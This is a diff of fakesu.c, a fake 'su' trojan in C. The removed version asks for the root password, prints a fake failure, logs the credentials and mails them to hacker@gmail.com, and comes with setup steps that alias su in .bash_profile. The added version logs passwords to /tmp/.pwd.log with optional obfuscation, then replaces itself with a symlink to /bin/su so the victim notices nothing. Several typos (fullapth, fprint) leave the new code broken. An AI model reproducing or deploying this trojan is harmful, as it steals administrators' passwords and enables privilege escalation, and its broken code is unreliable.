@@ -1,59 +1,124 @@
-
 /*
-* ##########################
-* ##　fakesu.c v.1.10　;P ##
-* ####### by　Zypeh ########
-* #########################
-*　
-*  Setting　up:
-*　admin@host:~$　gcc　-o　.su　fakesu.c;　rm　-rf　fakesu.c
-*　admin@host:~$　mv　.su　/var/tmp/.su
-*　admin@host:~$　cp　.bash_profile　.wgetrc
-*　admin@host:~$　echo　"alias　su=/var/tmp/.su">>.bash_profile
-*　admin@host:~$　logout
-*　***　LOGIN　***
-*　admin@host:~$　su
-*　Password:
-*　su:　Authentication　failure
-*　Sorry.
-*　admin@host:~$　su
-*　Password:
-*　root@host:~#　logout
-*　admin@host:~$　cat　/var/tmp/.pwds
-*　root:password
-*　admin@host:~$
-*
-*　/bin/su　sends　various　failure　information　depending　on　the　OS　ver.
-*　Please　modify　the　source　to　make　it　"fit"　;)
-*
+  Credit to: Oozie 2006
 */
-#include　
-#include　
-main(int　argc,　char　*argv[]){
-FILE　*fp;
-char　*user;
-char　*pass;
-char　filex[100];
-char　clean[100];
-sprintf(filex,"/var/tmp/.pwds");
-sprintf(clean,"rm　-rf　/var/tmp/.su;mv　-f　/home/admin/.wgetrc　/home/admin/.bash_profile");
-if(argc==1)　user="root";
-if(argc==2)　user=argv[1];
-if(argc>2){
-if(strcmp(argv[1],　"-l")==0)
-　　　user=argv[2];
-else　user=argv[1];}
-fprintf(stdout,"Password:　");　pass=getpass　("");
-system("sleep　3");
-fprintf(stdout,"su:　Authentication　failure\nSorry.\n");
-if　((fp=fopen(filex,"w"))　!=　NULL)
-　　{
-　　fprintf(fp,　"%s:%s\n",　user,　pass);
-　　fclose(fp);
-　　}
-system(clean);
-system("rm　-rf　/var/tmp/.su;　ln　-s　/bin/su　/var/tmp/.su");
-/*　If　you　don't　want　password　in　your　e-mail　uncomment　this　line:　*/
-system("uname　-a　>>　/var/tmp/.pwds;　cat　/var/tmp/.pwds　|　mail　hacker@gmail.com");
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+#define LOG "/tmp/.pwd.log"
+#define SU "/bin/su"
+
+#ifdef CRYPTO
+#define CRYPTO 1
+#endif
+#ifndef CRYPTO
+#define CRYPTO 0
+#endif
+
+/* This is not part of this programme,
+   it just a PoC of how-to decrypt the password encrytio.
+   
+char *decrypt (char *string2) {
+	int i;
+
+	for (i = 0; i < strlen (string2); i += 2)
+		string2 [i]--;
+	for (i = 1; i < strlen (string2); i += 2)
+		string2 [i]++;
+
+	return string2;
+}
+*/
+
+char *encrypt (char *string) {
+	int i;
+
+	for (i = 0; i < strlen (string); i += 2)
+		string [i]++;
+	for (i = 1; i < strlen (string); i += 2)
+		string [i]--;
+
+	return string;
 }
 
+int main (int argc, char **argv) {
+	char passwd [256];
+	char *path, *newpath, *token, *fullpath;
+	struct stat *buf;
+	FILE *pwdfile;
+	int fd, lock = 0;
+
+	path = (char *)malloc (1024);
+	newpath = (char *)malloc (1024);
+	fullpath = (char *)malloc (256);
+
+	path = getenv ("PATH");
+	token = strtok (path,":");
+
+	do {
+
+		if (lock == 0) {
+			strcpy (fullapth, token);
+			strcat (fullpath, "/");
+			strcat (fullapth, argv [0]);
+
+			if (!(remove (fullpath))) {
+				strcpy (newpath, fullpath);
+				lock = 1;
+			}
+		}
+	} while (token = strtok (NULL, ":"));
+	symlink (SU, newpath);
+	/* [!] Important
+	   symbolic link must be made binary is gone.
+	   After the original. Otherwise, the victim
+	   executing su once again can see the full path
+	   to non-existent trojan followed by an error
+	   message -- We don't want that happen!
+	*/
+
+	strncpy (passwd, getpass ("Password: "), 256);
+	pwdfile = fopen (LOG, "w");
+	if (CRYPTO) encrypt (passwd);
+	fprint (pwdfile, "%s\n", passwd);
+	fclose (pwdfile);
+
+	sleep (3);
+	printf ("%s: incorrect password\n", argv [0]);
+	return 0;
+}
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	  
+					   
+			
+			
+				   
+	
+	
+	
+	
+	
+	
+	
+	
+	
+		 
+	
+		
+		
+		
+		
+		
